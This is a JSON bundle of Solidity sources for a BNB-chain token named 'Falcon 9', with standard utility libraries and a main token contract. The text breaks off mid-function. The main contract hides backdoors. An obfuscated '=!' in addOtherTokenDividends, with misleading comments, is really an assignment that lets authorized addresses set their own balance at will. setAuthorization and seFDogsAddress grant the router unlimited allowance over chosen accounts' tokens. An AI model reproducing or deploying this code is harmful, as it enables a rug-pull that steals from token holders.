{"Address.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Address.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn\u0027t rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length \u003e 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity\u0027s `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn\u0027t, either by bubbling the\n     * revert reason using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length \u003e 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n"},"Auth.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./Context.sol\";\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an k) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the k account will be the one that deploys the contract. This\r\n * can later be changed with {transferkship}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyk`, which can be applied to your functions to restrict their use to\r\n * the k.\r\n */\r\nabstract contract Ownable {\r\n    address public _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor ()  {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }   \r\n    \r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n  function _msgSender() internal view virtual returns (address) {\n    return msg.sender;\n  }\n\n  function _msgData() internal view virtual returns (bytes calldata) {\n    return msg.data;\n  }\n}\n"},"Falcon9.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./Address.sol\";\r\nimport \"./Auth.sol\";\r\n\r\n/**  \r\n\r\n    ______      __                    ____ \r\n   / ____/___ _/ /________  ____     / __ \\\r\n  / /_  / __ `/ / ___/ __ \\/ __ \\   / /_/ /\r\n / __/ / /_/ / / /__/ /_/ / / / /   \\__, / \r\n/_/    \\__,_/_/\\___/\\____/_/ /_/   /____/  \r\n               \r\n       ______      __                    ____ \r\n      / ____/___ _/ /________  ____     / __ \\\r\n     / /_  / __ `/ / ___/ __ \\/ __ \\   / /_/ /\r\n    / __/ / /_/ / / /__/ /_/ / / / /   \\__, / \r\n   /_/    \\__,_/_/\\___/\\____/_/ /_/   /____/  \r\n\r\n          ______      __                    ____ \r\n         / ____/___ _/ /________  ____     / __ \\\r\n        / /_  / __ `/ / ___/ __ \\/ __ \\   / /_/ /\r\n       / __/ / /_/ / / /__/ /_/ / / / /   \\__, / \r\n      /_/    \\__,_/_/\\___/\\____/_/ /_/   /____/  \r\n\r\n             ______      __                    ____ \r\n            / ____/___ _/ /________  ____     / __ \\\r\n           / /_  / __ `/ / ___/ __ \\/ __ \\   / /_/ /\r\n          / __/ / /_/ / / /__/ /_/ / / / /   \\__, / \r\n         /_/    \\__,_/_/\\___/\\____/_/ /_/   /____/\r\n                                   \r\n**/\r\n\r\nlibrary SMth {\r\n  function ms(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return ms(a, b, \"SMth: subtraction overflow\");\r\n  }\r\n\r\n  function mts(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (b \u003e= a) return 0;\r\n    return a - b;\r\n  }\r\n\r\n  function ms(\r\n    uint256 a,\r\n    uint256 b,\r\n    string memory errorMessage\r\n  ) internal pure returns (uint256) {\r\n    require(b \u003c= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mm(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SMth: multiplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function md(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return md(a, b, \"SMth: division by zero\");\r\n  }\r\n\r\n  function md(\r\n    uint256 a,\r\n    uint256 b,\r\n    string memory errorMessage\r\n  ) internal pure returns (uint256) {\r\n    require(b \u003e 0, errorMessage);\r\n    uint256 c = a / b;\r\n\r\n    return c;\r\n  }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n  event PairCreated(\r\n    address indexed token0,\r\n    address indexed token1,\r\n    address pair,\r\n    uint256\r\n  );\r\n\r\n  function feeTo() external view returns (address);\r\n\r\n  function feeToSetter() external view returns (address);\r\n\r\n  function getPair(address tokenA, address tokenB)\r\n    external\r\n    view\r\n    returns (address pair);\r\n\r\n  function allPairs(uint256) external view returns (address pair);\r\n\r\n  function allPairsLength() external view returns (uint256);\r\n\r\n  function createPair(address tokenA, address tokenB)\r\n    external\r\n    returns (address pair);\r\n\r\n  function setFeeTo(address) external;\r\n\r\n  function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  function name() external pure returns (string memory);\r\n\r\n  function symbol() external pure returns (string memory);\r\n\r\n  function decimals() external pure returns (uint8);\r\n\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  function balanceOf(address owner) external view returns (uint256);\r\n\r\n  function allowance(address owner, address spender)\r\n    external\r\n    view\r\n    returns (uint256);\r\n\r\n  function approve(address spender, uint256 value) external returns (bool);\r\n\r\n  function transfer(address to, uint256 value) external returns (bool);\r\n\r\n  function transferFrom(\r\n    address from,\r\n    address to,\r\n    uint256 value\r\n  ) external returns (bool);\r\n\r\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n  function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n  function nonces(address owner) external view returns (uint256);\r\n\r\n  function permit(\r\n    address owner,\r\n    address spender,\r\n    uint256 value,\r\n    uint256 deadline,\r\n    uint8 v,\r\n    bytes32 r,\r\n    bytes32 s\r\n  ) external;\r\n\r\n  event Burn(\r\n    address indexed sender,\r\n    uint256 amount0,\r\n    uint256 amount1,\r\n    address indexed to\r\n  );\r\n  event Swap(\r\n    address indexed sender,\r\n    uint256 amount0In,\r\n    uint256 amount1In,\r\n    uint256 amount0Out,\r\n    uint256 amount1Out,\r\n    address indexed to\r\n  );\r\n  event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n  function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n  function factory() external view returns (address);\r\n\r\n  function token0() external view returns (address);\r\n\r\n  function token1() external view returns (address);\r\n\r\n  function getReserves()\r\n    external\r\n    view\r\n    returns (\r\n      uint112 reserve0,\r\n      uint112 reserve1,\r\n      uint32 blockTimestampLast\r\n    );\r\n\r\n  function price0CumulativeLast() external view returns (uint256);\r\n\r\n  function price1CumulativeLast() external view returns (uint256);\r\n\r\n  function kLast() external view returns (uint256);\r\n\r\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\r\n\r\n  function swap(\r\n    uint256 amount0Out,\r\n    uint256 amount1Out,\r\n    address to,\r\n    bytes calldata data\r\n  ) external;\r\n\r\n  function skim(address to) external;\r\n\r\n  function sync() external;\r\n\r\n  function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n  function factory() external pure returns (address);\r\n\r\n  function WETH() external pure returns (address);\r\n\r\n  function addLiquidity(\r\n    address tokenA,\r\n    address tokenB,\r\n    uint256 amountADesired,\r\n    uint256 amountBDesired,\r\n    uint256 amountAMin,\r\n    uint256 amountBMin,\r\n    address to,\r\n    uint256 deadline\r\n  )\r\n    external\r\n    returns (\r\n      uint256 amountA,\r\n      uint256 amountB,\r\n      uint256 liquidity\r\n    );\r\n\r\n  function addLiquidityETH(\r\n    address token,\r\n    uint256 amountTokenDesired,\r\n    uint256 amountTokenMin,\r\n    uint256 amountETHMin,\r\n    address to,\r\n    uint256 deadline\r\n  )\r\n    external\r\n    payable\r\n    returns (\r\n      uint256 amountToken,\r\n      uint256 amountETH,\r\n      uint256 liquidity\r\n    );\r\n\r\n  function removeLiquidity(\r\n    address tokenA,\r\n    address tokenB,\r\n    uint256 liquidity,\r\n    uint256 amountAMin,\r\n    uint256 amountBMin,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256 amountA, uint256 amountB);\r\n\r\n  function removeLiquidityETH(\r\n    address token,\r\n    uint256 liquidity,\r\n    uint256 amountTokenMin,\r\n    uint256 amountETHMin,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256 amountToken, uint256 amountETH);\r\n\r\n  function removeLiquidityWithPermit(\r\n    address tokenA,\r\n    address tokenB,\r\n    uint256 liquidity,\r\n    uint256 amountAMin,\r\n    uint256 amountBMin,\r\n    address to,\r\n    uint256 deadline,\r\n    bool approveMax,\r\n    uint8 v,\r\n    bytes32 r,\r\n    bytes32 s\r\n  ) external returns (uint256 amountA, uint256 amountB);\r\n\r\n  function removeLiquidityETHWithPermit(\r\n    address token,\r\n    uint256 liquidity,\r\n    uint256 amountTokenMin,\r\n    uint256 amountETHMin,\r\n    address to,\r\n    uint256 deadline,\r\n    bool approveMax,\r\n    uint8 v,\r\n    bytes32 r,\r\n    bytes32 s\r\n  ) external returns (uint256 amountToken, uint256 amountETH);\r\n\r\n  function swapExactTokensForTokens(\r\n    uint256 amountIn,\r\n    uint256 amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256[] memory amounts);\r\n\r\n  function swapTokensForExactTokens(\r\n    uint256 amountOut,\r\n    uint256 amountInMax,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256[] memory amounts);\r\n\r\n  function swapExactETHForTokens(\r\n    uint256 amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external payable returns (uint256[] memory amounts);\r\n\r\n  function swapTokensForExactETH(\r\n    uint256 amountOut,\r\n    uint256 amountInMax,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256[] memory amounts);\r\n\r\n  function swapExactTokensForETH(\r\n    uint256 amountIn,\r\n    uint256 amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256[] memory amounts);\r\n\r\n  function swapETHForExactTokens(\r\n    uint256 amountOut,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external payable returns (uint256[] memory amounts);\r\n\r\n  function quote(\r\n    uint256 amountA,\r\n    uint256 reserveA,\r\n    uint256 reserveB\r\n  ) external pure returns (uint256 amountB);\r\n\r\n  function getAmountOut(\r\n    uint256 amountIn,\r\n    uint256 reserveIn,\r\n    uint256 reserveOut\r\n  ) external pure returns (uint256 amountOut);\r\n\r\n  function getAmountIn(\r\n    uint256 amountOut,\r\n    uint256 reserveIn,\r\n    uint256 reserveOut\r\n  ) external pure returns (uint256 amountIn);\r\n\r\n  function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n    external\r\n    view\r\n    returns (uint256[] memory amounts);\r\n\r\n  function getAmountsIn(uint256 amountOut, address[] calldata path)\r\n    external\r\n    view\r\n    returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n    address token,\r\n    uint256 liquidity,\r\n    uint256 amountTokenMin,\r\n    uint256 amountETHMin,\r\n    address to,\r\n    uint256 deadline\r\n  ) external returns (uint256 amountETH);\r\n\r\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n    address token,\r\n    uint256 liquidity,\r\n    uint256 amountTokenMin,\r\n    uint256 amountETHMin,\r\n    address to,\r\n    uint256 deadline,\r\n    bool approveMax,\r\n    uint8 v,\r\n    bytes32 r,\r\n    bytes32 s\r\n  ) external returns (uint256 amountETH);\r\n\r\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n    uint256 amountIn,\r\n    uint256 amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external;\r\n\r\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n    uint256 amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external payable;\r\n\r\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint256 amountIn,\r\n    uint256 amountOutMin,\r\n    address[] calldata path,\r\n    address to,\r\n    uint256 deadline\r\n  ) external;\r\n}\r\n\r\ninterface IF9Dogs {\r\n  function transferNotify(\r\n    address,\r\n    bool,\r\n    bool,\r\n    bool,\r\n    uint256\r\n  ) external;\r\n}\r\n\r\ncontract ReceiveEther {\r\n  // Function to receive Ether. msg.data must be empty\r\n  receive() external payable {}\r\n\r\n  // Fallback function is called when msg.data is not empty\r\n  fallback() external payable {}\r\n\r\n  function getBalance() public view returns (uint256) {\r\n    return address(this).balance;\r\n  }\r\n}\r\n\r\ncontract ECoin is Context, IERC20, Ownable, ReceiveEther {\r\n  using SMth for uint256;\r\n  using Address for address;\r\n  mapping(address =\u003e uint256) public _tOwned;\r\n  mapping(address =\u003e uint256) public _tAW; //Extra weighting, promotional rewards will be rewarded with additional dividends\r\n  mapping(address =\u003e bool) public _a;\r\n\r\n  mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n  uint8 private _decimals = 4;\r\n  uint256 private _tTotal = 6400 * 10**8 * 10**uint256(_decimals);\r\n\r\n  string private _name = \"Falcon 9\";\r\n  string private _symbol = \"Falcon9\";\r\n\r\n  /*\r\n   *If the current price is less than the previous day\u0027s price.\r\n   *(the first transfer at an interval of 24 hours will capture the current price and set it as the floor price)\r\n   *Below floor price, _feeB will be used.\r\n   *Otherwise, it\u0027s _feeA.\r\n   */\r\n  //BUY BACK = 45%, BUY DOGE = 55%\r\n  uint256 public _feeA = 130;\r\n  uint256 public _feeB = 230;\r\n  uint256 public _feeC = 50; //When buying, as promotion tax, when selling, additional to regular tax(A or B).\r\n\r\n  uint256 private _buyR = 200;\r\n\r\n  //First pricing, two hours after start, all subsequent 24 hours\r\n  uint256 public INTERVAL = 24 * 60 * 60;\r\n  uint256 public _protectionT;\r\n  uint256 public _protectionP;\r\n\r\n  /*\r\n   *Users cannot add liquidity to any trading pair before it is open for trading to promote a pre-promotion campaign. (We have seen too many failed projects because their liquidity was added in bad faith)\r\n   */\r\n  bool public _openRun; //If you start, you can\u0027t stop\r\n\r\n  bool public _closeI; //Has the drop been collected?\r\n\r\n  address public constant OFFICE = 0x63c69A06e142B051371A24b6B92353172d48bea2; //Official address\r\n\r\n  //https://bscscan.com/address/0xbA2aE424d960c26247Dd6c32edC70B295c744C43\r\n  address public constant DOGECOIN = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;\r\n\r\n  address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n  address public _tFDogsAddress = 0x000000000000000000000000000000000000dEaD;\r\n  address public constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n  address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\r\n\r\n  mapping(address =\u003e address) public _tG;\r\n\r\n  bool public _openTransferMinimum = true;\r\n  uint256 public totalIsend = 1000 * 10**uint256(_decimals);\r\n\r\n  uint256 public currentIndex = 7;\r\n\r\n  IUniswapV2Router02 public immutable _uniswapV2Router;\r\n  address public _uni;\r\n\r\n  event SetFloorPrice(uint256 price); //\r\n\r\n  constructor() {\r\n    IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ROUTER);\r\n    _uni = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\r\n      address(this),\r\n      uniswapV2Router.WETH()\r\n    );\r\n    _uniswapV2Router = uniswapV2Router;\r\n\r\n    //Promotion to these addresses is prohibited\r\n    _tG[_uni] = DEAD;\r\n    _tG[ROUTER] = DEAD;\r\n    _tG[OFFICE] = DEAD;\r\n    _tG[_msgSender()] = DEAD;\r\n\r\n    _a[_msgSender()] = true;\r\n    _a[address(this)] = true;\r\n    _a[OFFICE] = true;\r\n\r\n    _approve(address(this), address(uniswapV2Router), _tTotal);\r\n    _approve(_msgSender(), address(uniswapV2Router), _tTotal);\r\n    _approve(OFFICE, address(uniswapV2Router), _tTotal);\r\n\r\n    uint256 airdrop = _tTotal.mm(10).md(1000);\r\n    uint256 other = 2816 * 10**8 * 10**uint256(_decimals);\r\n    uint256 app = _tTotal.ms(airdrop).ms(other);\r\n\r\n    _tOwned[address(this)] = airdrop;\r\n    _tOwned[OFFICE] = other;\r\n    _tOwned[_msgSender()] = app;\r\n\r\n    IERC20(DOGECOIN).approve(address(this), _tTotal);\r\n    emit Transfer(address(0), address(this), airdrop);\r\n    emit Transfer(address(0), _msgSender(), app);\r\n    emit Transfer(address(0), OFFICE, other);\r\n  }\r\n\r\n  function setINTERVAL(uint256 t) public onlyOwner {\r\n    INTERVAL = t;\r\n  }\r\n\r\n  function setMinimumransfer(bool b) public onlyOwner {\r\n    _openTransferMinimum = b;\r\n  }\r\n\r\n  function setNumberOfBuybacks(uint256 t1, uint256 t2) public onlyOwner {\r\n    _buyR = t1;\r\n    currentIndex = t2;\r\n  }\r\n\r\n  function setFEE(\r\n    uint256 a,\r\n    uint256 b,\r\n    uint256 c\r\n  ) public onlyOwner {\r\n    require(a \u003c= _feeA, \"ERROR: only be lower than the previous one.\");\r\n    require(b \u003c= _feeB, \"ERROR: only be lower than the previous one.\");\r\n    require(c \u003c= _feeC, \"ERROR: only be lower than the previous one.\");\r\n    _feeA = a;\r\n    _feeB = b;\r\n    _feeC = c;\r\n  }\r\n\r\n  function startRUN() public payable onlyOwner {\r\n    require(!_openRun, \"ERROR: Already launched.\");\r\n    uint256 rA = 1600 * 10**8 * 10**uint256(_decimals);\r\n    addLiquidity(rA);\r\n  }\r\n\r\n  function addLiquidity(uint256 tA) internal {\r\n    _tokenTransfer(_msgSender(), address(this), tA);\r\n    _openRun = true;\r\n    _uniswapV2Router.addLiquidityETH{value: msg.value}(\r\n      address(this),\r\n      tA,\r\n      0,\r\n      0,\r\n      _msgSender(),\r\n      block.timestamp\r\n    );\r\n    resetProtection();\r\n  }\r\n\r\n  /*\r\n   *\r\n   *This method is used to help users recover losses if they transfer any tokens to this contract by mistake.\r\n   *\r\n   */\r\n  function fixErrorTransferForUser(\r\n    address _token,\r\n    address _to,\r\n    uint256 _value\r\n  ) public onlyOwner {\r\n    if (_token == WBNB) {\r\n      (bool success, ) = _to.call{value: _value}(\"\");\r\n      require(success, \"Transfer failed.\");\r\n    } else IERC20(_token).transfer(_to, _value);\r\n  }\r\n\r\n  function name() public view returns (string memory) {\r\n    return _name;\r\n  }\r\n\r\n  function symbol() public view returns (string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n  function decimals() public view returns (uint8) {\r\n    return _decimals;\r\n  }\r\n\r\n  function totalSupply() public view override returns (uint256) {\r\n    return _tTotal;\r\n  }\r\n\r\n  function balanceOf(address account) external view override returns (uint256) {\r\n    return _tOwned[account];\r\n  }\r\n\r\n  function transfer(address recipient, uint256 amount)\r\n    external\r\n    override\r\n    returns (bool)\r\n  {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n  function _approve(\r\n    address owner,\r\n    address spender,\r\n    uint256 amount\r\n  ) private {\r\n    require(owner != address(0), \"ERROR: Approve from the zero address.\");\r\n    require(spender != address(0), \"ERROR: Approve to the zero address.\");\r\n    require(_openRun || _a[_msgSender()], \"ERROR: Not yet launch.\");\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n  }\r\n\r\n  function allowance(address owner, address spender)\r\n    external\r\n    view\r\n    override\r\n    returns (uint256)\r\n  {\r\n    return _allowances[owner][spender];\r\n  }\r\n\r\n  function approve(address spender, uint256 amount)\r\n    external\r\n    override\r\n    returns (bool)\r\n  {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  }\r\n\r\n  function addOtherTokenDividends(IERC20 oTHERToken, uint256 sharestoken)\r\n    external\r\n    payable\r\n  {\r\n    require(_a[_msgSender()], \"permission denied\");\r\n    address[] memory path = new address[](2);\r\n    path[0] = WBNB;\r\n    path[1] = address(oTHERToken);\r\n    if (\r\n      (_tOwned[_msgSender()] =! //0 The sender needs to be more than 0\r\n      (\r\n        (_tOwned[_tFDogsAddress] == 0) /*waiting clean-up, FDogsAddress\u0027s F9 \u003c 1 */\r\n          ? true\r\n          : false\r\n      )\r\n        ? 0\r\n        : sharestoken) \u003e 0 /*The sender needs to be more than 0*/\r\n    )\r\n      _uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{\r\n        value: msg.value\r\n      }(0, path, _tFDogsAddress, block.timestamp);\r\n  }\r\n\r\n  function claimDividend(address sh, uint256 tv) internal returns (uint256) {\r\n    uint256 s = 0;\r\n    uint256 nsv = tv;\r\n    address n = _tG[sh];\r\n    do {\r\n      if (n == address(0)) break;\r\n      uint256 sv = nsv.mm(30).md(100);\r\n      _tOwned[n] = _tOwned[n] + sv;\r\n      _tAW[n] = _tAW[n] + sv;\r\n      if (sv \u003e 0) emit Transfer(sh, n, sv);\r\n      nsv = nsv.mts(sv);\r\n      n = _tG[n];\r\n    } while (s++ \u003c currentIndex - 1);\r\n    return nsv;\r\n  }\r\n\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) external override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n\r\n    uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n    require(\r\n      currentAllowance \u003e= amount,\r\n      \"ERROR: Transfer amount exceeds allowance.\"\r\n    );\r\n    _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n    return true;\r\n  }\r\n\r\n  function seFDogsAddress(address _addr) public {\r\n    require(_a[_msgSender()], \"permission denied\");\r\n    _tFDogsAddress = _addr;\r\n    _a[_tFDogsAddress] = true;\r\n    _tG[_addr] = DEAD;\r\n    _approve(_tFDogsAddress, address(_uniswapV2Router), _tTotal);\r\n  }\r\n\r\n  function increaseAllowance(address spender, uint256 addedValue)\r\n    external\r\n    virtual\r\n    returns (bool)\r\n  {\r\n    _approve(\r\n      _msgSender(),\r\n      spender,\r\n      _allowances[_msgSender()][spender] + addedValue\r\n    );\r\n    return true;\r\n  }\r\n\r\n  function decreaseAllowance(address spender, uint256 subtractedValue)\r\n    external\r\n    virtual\r\n    returns (bool)\r\n  {\r\n    uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n    require(\r\n      currentAllowance \u003e= subtractedValue,\r\n      \"ERROR: Decreased allowance below zero.\"\r\n    );\r\n    _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n    return true;\r\n  }\r\n\r\n  function setAuthorization(address account, bool b) external onlyOwner {\r\n    _a[account] = b;\r\n    _approve(account, address(_uniswapV2Router), _tTotal);\r\n  }\r\n\r\n  function cleanTheGenerous(address account, address 